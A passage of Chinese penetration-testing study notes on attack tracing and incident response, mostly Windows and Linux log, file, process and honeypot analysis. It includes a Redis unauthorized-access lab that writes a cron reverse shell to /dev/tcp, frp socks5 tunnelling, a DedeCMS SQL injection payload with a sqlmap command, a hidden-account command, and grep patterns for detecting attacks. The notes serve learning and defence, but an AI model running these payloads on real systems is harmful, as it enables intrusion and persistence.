href="#漏洞扫描-1" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p><img src="assets/clip_image029.jpg" alt="img"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>攻击</li><li>防御绕过</li><li>维持访问 (后渗透攻击)</li></ul><h3 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h3><ul><li>发现了什么漏洞</li><li>危害性</li><li>怎么发现的</li><li>如何复现</li><li>原因分析</li><li>修补建议</li></ul><p><img src="assets/clip_image030.jpg" alt="img"></p><h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><h2 id="5、渗透测试与Kali"><a href="#5、渗透测试与Kali" class="headerlink" title="5、渗透测试与Kali"></a>5、渗透测试与Kali</h2><h3 id="渗透测试与Kali"><a href="#渗透测试与Kali" class="headerlink" title="渗透测试与Kali"></a>渗透测试与Kali</h3><p>An Advanced Penetration Testing Linux distribution used for Penetration Testing</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/33-su-yuan/su-yuan/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/33-su-yuan/su-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="溯源的概念"><a href="#溯源的概念" class="headerlink" title="溯源的概念"></a>溯源的概念</h1><h2 id="溯源的概念-1"><a href="#溯源的概念-1" class="headerlink" title="溯源的概念"></a>溯源的概念</h2><p><strong>通过对受害资产与内网流量进行分析一定程度上还原攻击者的攻击路径与攻击手法</strong></p><p>根据已有的线索，攻击方式以及攻击特征等通过技术手段反查攻击者身份或是组织信息</p><h2 id="溯源应用的场景"><a href="#溯源应用的场景" class="headerlink" title="溯源应用的场景"></a>溯源应用的场景</h2><h3 id="1、HW攻防演练"><a href="#1、HW攻防演练" class="headerlink" title="1、HW攻防演练"></a>1、HW攻防演练</h3><h4 id="护网蓝队"><a href="#护网蓝队" class="headerlink" title="护网蓝队"></a>护网蓝队</h4><p>在HW过程中，蓝队的防守和反制是-个重点，在发现资产受到攻击之后,防守方需要及时进行排查和溯源，通常情况下，溯源需要获取到目标攻击者的一部分个人信息.</p><p><img src="assets/image-20230424150100287.png" alt="image-20230424150100287"></p><h4 id="攻击画像"><a href="#攻击画像" class="headerlink" title="攻击画像"></a>攻击画像</h4><pre class="line-numbers language-none"><code class="language-none">溯源结果如下:姓名/ID:攻击IP:地理位置:QQ:IP地址所属公司:IP地址关联域名:邮箱:手机号:微信/微博/src/id证明: .人物照片:跳板机(可选) :关联攻击事件:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="加分规则"><a href="#加分规则" class="headerlink" title="加分规则"></a>加分规则</h4><table><thead><tr><th>描述<br></th><th>完整还原攻击链条，溯源到黑客的虚拟身份、真实身份,溯<br>源到攻击队员，反控攻击方主机根据程度阶梯给分。<br></th></tr></thead><tbody><tr><td>加分规则<br></td><td>描述详细/思路清晰，提交确凿证据报告，根据溯源攻击者<br>虚拟身份、真实身份的程度，500-3000分，反控攻击方主<br>机，再增加500分/次。</td></tr></tbody></table><h3 id="2、应急响应"><a href="#2、应急响应" class="headerlink" title="2、应急响应"></a>2、应急响应</h3><p>服务器受到黑客的攻击，需要进行攻击事件的溯源。</p><h2 id="溯源的意义"><a href="#溯源的意义" class="headerlink" title="溯源的意义"></a>溯源的意义</h2><ol><li>为警民联动奠定基础。</li><li>对攻击者造成威慑。</li><li>提升安全实战化防护水平。</li></ol><h1 id="如何还原攻击路径"><a href="#如何还原攻击路径" class="headerlink" title="如何还原攻击路径"></a>如何还原攻击路径</h1><h2 id="web入侵的流程"><a href="#web入侵的流程" class="headerlink" title="web入侵的流程"></a>web入侵的流程</h2><ul><li>信息收集</li><li>漏洞扫描</li><li>渗透攻击</li><li>提权</li><li>后渗透</li><li>持续控制</li></ul><h2 id="Windows应急排查"><a href="#Windows应急排查" class="headerlink" title="Windows应急排查"></a>Windows应急排查</h2><h3 id="靶场环境介绍"><a href="#靶场环境介绍" class="headerlink" title="靶场环境介绍"></a>靶场环境介绍</h3><h4 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h4><p>win,NAT: 192.168.0.105</p><p>kali,NAT: 192.168.0.132</p><h4 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h4><p>win仅主机：192.168.203.150</p><p>win,NAT: 192.168.0.107 </p><h4 id="redis服务器"><a href="#redis服务器" class="headerlink" title="redis服务器"></a>redis服务器</h4><p>kali仅主机：192.168.203.128</p><p><img src="assets/image-20230424154226755.png" alt="image-20230424154226755"></p><h4 id="将流量带出来"><a href="#将流量带出来" class="headerlink" title="将流量带出来"></a>将流量带出来</h4><pre class="line-numbers language-none"><code class="language-none">##通过蚁剑上传frpc,访问内网其他机器win服务端frps.ini:[common]bind_port = 2098frps.exe -c frps.iniwin客户端frpc.ini：[common]server_addr = 192.168.0.105server_port = 2098[socks5]type = tcpplugin = socks5remote_port = 2091frpc.exe -c frpc.inikali自带的proxychains4.conf:vim /etc/proxychains4.confsocks5 192.168.0.105 2091<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="举例：redis未授权访问"><a href="#举例：redis未授权访问" class="headerlink" title="举例：redis未授权访问"></a>举例：redis未授权访问</h4><p>环境：redis-6.0.3版本左右,版本太高会报无权设置<code>dir</code></p><pre class="line-numbers language-none"><code class="language-none">#redis.conf设置：vim /home/kali/redis-stable/redis.confbind 192.168.70.3  #启动远程连接protected-mode yes --&gt; no  #关闭保护模式将133行解除注释并将enable-protected-configs no --&gt; yes #运行修改配置:wq #重启redis服务redis-cli shutdownredis-server /home/kali/redis-stable/redis.confps -ef | grep redis#或临时启动关闭保护模式redis-server --protected-mode no#监听2222端口nc -lvnp 2222#连接redisproxychains4 ./redis-cli -h 192.168.70.3#redis写隐藏计划任务set shell "\n\n*/1 **** /bin/bash -i&gt;&amp;/dev/tcp/192.168.70.3/2222 0&gt;&amp;1\n\n"config set dir /var/spool/cron/config set dbfilename rootsave#查看隐藏的计划任务cat /var/spool/cron/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="1、什么是日志"><a href="#1、什么是日志" class="headerlink" title="1、什么是日志?"></a>1、什么是日志?</h4><p>日志记录一个服务或应用程序在运行过程中发生的事件和活动。</p><h4 id="2、日志分类"><a href="#2、日志分类" class="headerlink" title="2、日志分类"></a>2、日志分类</h4><h5 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h5><h6 id="web日志存放路径"><a href="#web日志存放路径" class="headerlink" title="web日志存放路径"></a>web日志存放路径</h6><p>windows默认路径:在安装目录下的logs文件夹下</p><h6 id="tomcat日志"><a href="#tomcat日志" class="headerlink" title="tomcat日志"></a>tomcat日志</h6><p>catalina.out、localhost、 manager、 localhost_ access_ log4种格式日志。</p><h6 id="apache日志、nginx日志、-IIS日志"><a href="#apache日志、nginx日志、-IIS日志" class="headerlink" title="apache日志、nginx日志、 IIS日志 ."></a>apache日志、nginx日志、 IIS日志 .</h6><p>access_ log和error_ log</p><pre class="line-numbers language-none"><code class="language-none">#apache日志192.168.10.244 - - [06/Oct/2022:16:31:49 +0800] "GET /dedecms/uploads/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294%20```%20![] HTTP/1.1" 200 2837#sql注入sqlmap -u http://192.168.70.7:8091/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=*+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294%20```%20![]#爆破目录dirsearch -u http://192.168.70.7:8091<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="web日志分析工具"><a href="#web日志分析工具" class="headerlink" title="web日志分析工具"></a>web日志分析工具</h6><p>在线工具: <a href="https://tilipa.zlsam.com/loger/">https://tilipa.zlsam.com/loger/</a></p><h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><p>windows系统日志包含系统日志，安全日志、应用日志等</p><h6 id="敏感事件id"><a href="#敏感事件id" class="headerlink" title="敏感事件id"></a>敏感事件id</h6><ul><li>4624登录成功</li><li>4625登录失败</li><li>4720创建用户</li><li>4634注销成功</li><li>4647用户启动的注销</li><li>4672使用超级用户/管理员用户进行登录</li></ul><p>事件查看器：<code>eventvwr</code></p><pre class="line-numbers language-none"><code class="language-none">#创建隐藏账号net user admin$ admin /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h6 id="系统日志分析-Log-Parser"><a href="#系统日志分析-Log-Parser" class="headerlink" title="系统日志分析-Log Parser"></a>系统日志分析-Log Parser</h6><p>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><pre class="line-numbers language-none"><code class="language-none">登录成功的所有事件LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where EventID=4624"指定登录时间范围的事件: LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where TimeGenerated &gt; '2023-04-25 12:32:11' and TimeGenerated &lt; '2023-04-26 12:32:11'提取登录成功的用户名和IP:LogParser -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,'') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,'') as Loginip FROM c:/Security.evtx where EventID=4624登录失败的所有事件:LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where EventID=4625"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、日志存放的位置"><a href="#3、日志存放的位置" class="headerlink" title="3、日志存放的位置"></a>3、日志存放的位置</h4><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h4><ol><li><p>(1) 各个盘下的temp相关目录<code>%temp%</code></p></li><li><p>(2)开机启动文件(启动菜单、注册表)</p></li><li><p>(3)浏览器的历史记录</p></li><li><p>(4) Recent文件</p></li><li><p>(5)攻击日期内新增的文件</p><pre class="line-numbers language-none"><code class="language-none">forfiles /m *.exe /d 2022/10/5 /s /c "cmd /c echo @path @fdate @ftime"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>(6)使用工具D盾、HwsKill、 WebshellKill等</p></li></ol><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><pre class="line-numbers language-none"><code class="language-none">临时文件：%temp%最近打卡文件：recent指定攻击日期后新增的文件：forfiles /m *.exe /d 2023/4/23 /s /c "cmd /c echo @path @fdate @ftime"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><h4 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h4><h5 id="1-查看端口得到PID"><a href="#1-查看端口得到PID" class="headerlink" title="(1) 查看端口得到PID"></a>(1) 查看端口得到PID</h5><pre class="line-numbers language-none"><code class="language-none">netstat -ano | findstr 端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-根据PID查看进程对应的程序名称"><a href="#2-根据PID查看进程对应的程序名称" class="headerlink" title="(2)根据PID查看进程对应的程序名称"></a>(2)根据PID查看进程对应的程序名称</h5><pre class="line-numbers language-none"><code class="language-none">tasklist /v | findstr PIDwmic process list brief | findstr PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="3-得到程序全路径名"><a href="#3-得到程序全路径名" class="headerlink" title="(3)得到程序全路径名"></a>(3)得到程序全路径名</h5><pre class="line-numbers language-none"><code class="language-none">wmic process where processid=PID get processid,executablepath,name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-杀掉进程"><a href="#4-杀掉进程" class="headerlink" title="(4)杀掉进程"></a>(4)杀掉进程</h5><pre class="line-numbers language-none"><code class="language-none">taskkill /PID 3876 /Fwmic process where name=" mysqld.exe" deletewmic process where processid=3876 call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="进程排除工具"><a href="#进程排除工具" class="headerlink" title="进程排除工具"></a>进程排除工具</h4><h5 id="ProcessExplorer"><a href="#ProcessExplorer" class="headerlink" title="ProcessExplorer"></a>ProcessExplorer</h5><p>进程资源管理器</p><p>下载地址：<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><h3 id="新增、隐藏账号排查"><a href="#新增、隐藏账号排查" class="headerlink" title="新增、隐藏账号排查"></a>新增、隐藏账号排查</h3><ol><li><p>1、通过命令:“<code>net user</code>“查看</p></li><li><p>2、通过“计算机管理”查看。<code>lusrmgr.msc</code></p></li><li><p>3、通过Windows安全 日志进行排查<code>eventvwr</code></p></li><li><p>4、通过查看注册表文件进行排查<code>regedit</code></p></li><li><p>5、通过Windows管理工具</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,SID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ol><li>(1) HKEY_CLASSES_ROOT (HKCR)</li><li>(2) HKEY_CURRENT_USER (HKCU)</li><li>(3) HKEY_LOCAL_MACHINE (HKLM)</li><li>(4) HKEY_USERS (HKU)</li></ol><pre class="line-numbers language-none"><code class="language-none">regedit#查看所有用户：计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names#查看自启动：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自启动、计划任务"><a href="#自启动、计划任务" class="headerlink" title="自启动、计划任务"></a>自启动、计划任务</h3><h4 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h4><pre class="line-numbers language-none"><code class="language-none">#查看自启动：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><pre class="line-numbers language-none"><code class="language-none">schtasks.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h4><ul><li><p>PCHunter: <a href="http://www.xuetr.com/">http://www.xuetr.com</a></p></li><li><p>火绒剑: <a href="https://www.huorong.cn/">https://www.huorong.cn</a></p></li><li><p>Process Explorer: <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p></li><li><p>processhacker: <a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p></li></ul><h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><ul><li>卡巴斯基: <a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> (推荐理由: 绿色版、最新病毒库)</li><li>大蜘蛛: <a href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a></li></ul><h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心: <a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区: <a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛: <a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区: <a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家: <a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><p>Virustotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>Virscan: <a href="http://www.virscan.org/">http://www.virscan.org</a></p><p>腾讯哈勃分析系统: <a href="https://habo.qq.com/">https://habo.qq.com</a></p><p>Jotti恶意软件扫描系统: <a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p><h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><p>D盾_Web查杀: <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShll查杀: <a href="http://shellpub.com/">http://shellpub.com</a></p><h2 id="Linux、应急排查"><a href="#Linux、应急排查" class="headerlink" title="Linux、应急排查"></a>Linux、应急排查</h2><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志存放的位置</p><pre class="line-numbers language-none"><code class="language-none">1、列出当天访问次数最多的IP命令cut -d- -f 1 log1 |uniq -c | sort -rn | head -202、查看每一个IP访问了多少个页面awk '{++S[$1]}END {for(a in S) print a,S[a]}' log13、看某一个页面被访问的次数grep "/index.php" log1 |wc -l4、查看某一个IP访问了哪些页面grep 192.168.70.3 log1 | awk '{print $1,$7}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">1、SQL注入检攻击检测grep -E -i "select" log12.xss跨站脚本攻击检测grep -E -i "(S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&amp;#x3c;(S+)&gt;|(S+)&amp;#x3c;(S+)/" log13.命令注入攻击攻击检测grep -E -i "ping%20-c%20|ls%20|cat%20|%20pwd|net user" log14.网站被植入webshell后门检测grep -E -i "eval|%eval|%execute|%3binsert|%20makewebtaski|/1 .asp|/1jsp|/1.php|/1.aspx %if" log15.暴力破解账号攻击检测grep -E -i "login" /www/logs/access.log| grep -E -i "POST"| grep -E -i "200"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="常用命令介绍"><a href="#常用命令介绍" class="headerlink" title="常用命令介绍:"></a>常用命令介绍:</h4><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><pre class="line-numbers language-none"><code class="language-none">find 文件路径 [选项] 内容#文件名-name 区分大小写 php -iname 不区分大小写 Php-inum 查找符合指定的inode编号的文件或目录ls -i 1.php4849669 1.phpfind -inum 4849669find -name "*.php"find -type f -name "*.php" |xargs grep 'eval' |more#文件类型-typef :普通文件 d :目录 i :软连接#文件大小-size 50k :50k的文件+50k :大于50k  -100k :小于100k  M :MB  G :GB#修改时间-atime 访问时间-mtime 数据修改时间-ctime 文件修改时间+5 6天前修改的所有文件 今天20号--&gt;14天前-5 5天内 15-20号5  精确的5天前的文件 15号find -mtime 0 -name "*.php" #当天修改的php文件find -ctime -0 -name "*.php" #3天内新增的php文件#权限-perm find -iname "*php" -perm 777#所属组，所有者-gid 组-uid -user 所有者用户名-nouser #逻辑运算-a 与&amp;-o 或|-not 非^find -mtime -3 -a -perm 777find -name "*.php" -o -name "*.jsp"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><pre class="line-numbers language-none"><code class="language-none">awk [选项] '正则匹配规则 处理规则' 路径-F 默认空格做分隔符 可以指定：，设置变量，数组，定义函数，加减运算，字符串的拼接$1 匹配/输出第1列  $0 原样输出sort -n 按照大小排序sort -n| uniq -c 排序去除统计awk '{print substr($4,2,11)}' log1 |sort| uniq -c  #第四列，第2个，11个字符串，排序，去重统计awk -F: 'length($2)==0 {print $1}' /etc/shadow  #查找空账号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h5><p>对系统造成损耗，可能会跑崩，不建议用。</p><h5 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h5><pre class="line-numbers language-none"><code class="language-none">grep   | cat ps-c 统计行数-v 去掉ps -ef |grep ssh |grep -v grepfind ./ -name "*.php" |xargs grep "eval"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统日志分析"><a href="#系统日志分析" class="headerlink" title="系统日志分析"></a>系统日志分析</h3><table><thead><tr><th>日志文件</th><th>说明</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>记录了系统定时任务相关的日志</td></tr><tr><td>/var/log/cups</td><td>记录打印信息的日志</td></tr><tr><td>/var/log/dmeslog</td><td>记录了系统在开机时内核自检的信息</td></tr><tr><td>/var/log/auth.log</td><td>系统授权信息，用户登录和使用的权限机制等。</td></tr><tr><td>/var/log/message</td><td>记录系统重要信息的日志。</td></tr><tr><td>/var/log/btmp</td><td>记录错误登录日志</td></tr><tr><td>/var/log/lastlog</td><td>记录系统中所有用户最后一次登录时间的日志</td></tr><tr><td>/var/log/wtmp</td><td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。</td></tr><tr><td>/var/log/utmp</td><td>记录当前已经登录的用户信息.</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">系统安全日志:cat /var/log/secure Centoscat /var/log/auth Ubuntuvim /etc/rsyslog.conf 查看日志存放位置比较重要的几个日志:登录失败记录: /var/log/btmp --&gt; lastb登录成功记录: /var/log/wtmp --&gt; last目前登录用户信息: /var/run/utmp密码验证失败grep "Failed password" /var/log/auth.log | wc -l密码认证成功grep "Accepted password for" /var/log/auth.log查看每个ip失败的次数grep "Failed password" /var/log/auth.log | awk '{if (NF==16){c[$11]++}else{c[$9]++}}END{for(u in c)print u,c[u]}'| sort -k 2 -nr | head查看每个用户名失败的次数grep "Failed password" /var/log/auth.log| awk '{if (NF==16){c[$9]++}else{c[$7]++}}END{for(u in c)print u,c[u]}'| sort -k 2 -nr | head查看密码修改时间ls -l /etc/passwd查看特权账号(权限为0的)awk -F: '$3==0{print $1}' /etc/passwd查看空口令账号awk -F: '$2==0{print $1}' /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进程和网络连接状态分析"><a href="#进程和网络连接状态分析" class="headerlink" title="进程和网络连接状态分析"></a>进程和网络连接状态分析</h3><pre class="line-numbers language-none"><code class="language-none">网络连接命令[netstat]-pant  #显示所有,程序名称,不显示别名，tcp连接查看隐藏进程ps -ef|awk '{print}'| sort -n |uniq &gt; 1ls /proc| sort -n |uniq &gt;2查看对应pid的对应程序ls -alt /proc/905显示执行中的程序top查看指定端口lsof -i:22查看pid对应打开的文件lsof -p 905<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><pre class="line-numbers language-none"><code class="language-none">检查系统计划任务cat /var/spool/cron/crontabscat /var/spool/cron/root #隐藏的计划任务路径crontab -u root -l cat /etc/rc.d/rc.localls /etc/rc3.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="如何溯源真实身份"><a href="#如何溯源真实身份" class="headerlink" title="如何溯源真实身份"></a>如何溯源真实身份</h1><h2 id="攻击源的捕获"><a href="#攻击源的捕获" class="headerlink" title="攻击源的捕获"></a>攻击源的捕获</h2><ul><li>安全设备</li><li>日志与流量分析</li><li>钓鱼 邮箱</li><li>蜜罐</li><li>系统排查出的异常文件、账号</li></ul><h3 id="1-获取哪些数据"><a href="#1-获取哪些数据" class="headerlink" title="1.获取哪些数据?"></a>1.获取哪些数据?</h3><p>攻击者ip、域名、后门、攻击组件、webshell</p><h3 id="2、通过什么方式去获取"><a href="#2、通过什么方式去获取" class="headerlink" title="2、通过什么方式去获取?"></a>2、通过什么方式去获取?</h3><p>蜜罐、安全设备、钓鱼邮件、文件日志进程分析</p><h4 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h4><h5 id="蜜罐的概念"><a href="#蜜罐的概念" class="headerlink" title="蜜罐的概念:"></a>蜜罐的概念:</h5><p>模拟各种常见的应用服务，诱导攻击者攻击，从而记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实IP及社交信息。</p><p><img src="assets/image-20230507174704311.png" alt="image-20230507174704311"></p><h5 id="蜜罐溯源的常见两种方式"><a href="#蜜罐溯源的常见两种方式" class="headerlink" title="蜜罐溯源的常见两种方式:"></a>蜜罐溯源的常见两种方式:</h5><ol><li>1、网站上插入特定的js文件。</li><li>2、网站上显示需要下载某插件。</li></ol><h5 id="蜜罐的分类"><a href="#蜜罐的分类" class="headerlink" title="蜜罐的分类: ."></a>蜜罐的分类: .</h5><ol><li><p>1、低交互蜜罐</p><p>模拟服务获取信息比较少安全</p></li><li><p>2、中交互蜜罐</p><p>比较真实的模拟系统，修改过的操作系统</p></li><li><p>3、高交互蜜罐</p><p>真实主机，配置难，不安全，维护难</p></li></ol><p><img src="assets/image-20230507181016222.png" alt="image-20230507181016222"></p><h5 id="蜜罐环境部署-Hfish-开源免费的低交互蜜罐"><a href="#蜜罐环境部署-Hfish-开源免费的低交互蜜罐" class="headerlink" title="蜜罐环境部署: Hfish 开源免费的低交互蜜罐"></a>蜜罐环境部署: Hfish 开源免费的低交互蜜罐</h5><p><a href="https://hfish.net/#/2-3-windows">https://hfish.net/#/2-3-windows</a></p><h5 id="蜜罐举例"><a href="#蜜罐举例" class="headerlink" title="蜜罐举例"></a>蜜罐举例</h5><ul><li>谛听(长亭科技)</li><li>幻盾、幻阵(默安)</li><li>蜃景(360)</li><li>春秋云阵|(永信至诚)</li><li>幻云(锦行科技)</li><li>明鉴迷网(安恒)</li><li>御阵(腾讯)</li><li>潜听(天融信)</li><li>幻影(非凡安全)</li><li>天燕(启明星辰)。</li><li>等等</li></ul><h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><p>从这些安全设备能获取哪些信息?</p><ol><li>1、全流量平台</li><li>2、waf</li><li>3、EDR</li></ol><h5 id="全流量"><a href="#全流量" class="headerlink" title="全流量"></a>全流量</h5><p>态势感知:</p><p>全面感知网络安全威胁态势、洞悉网络和应用运行的健康状态、通过全流量分析技术实现完整的网络攻击溯源取证</p><h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>web应用防火墙</p><p>专注于网站及Web应用系统的应用层安全防护</p><h5 id="EDR"><a href="#EDR" class="headerlink" 